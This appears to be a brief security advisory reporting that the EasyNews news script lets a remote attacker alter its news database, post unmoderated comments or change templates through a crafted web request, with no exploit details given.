EasyNews is a free, open-source script for displaying news stories on a website.

EasyNews is prone to a vulnerability which may allow a remote attacker to modify information in its Newsdatabase. As a result, a remote attacker may post unmoderated comments or possibly modify information in the templates used by EasyNews.

This may be exploited via a specially crafted web request.

Earlier versions may also be vulnerable.
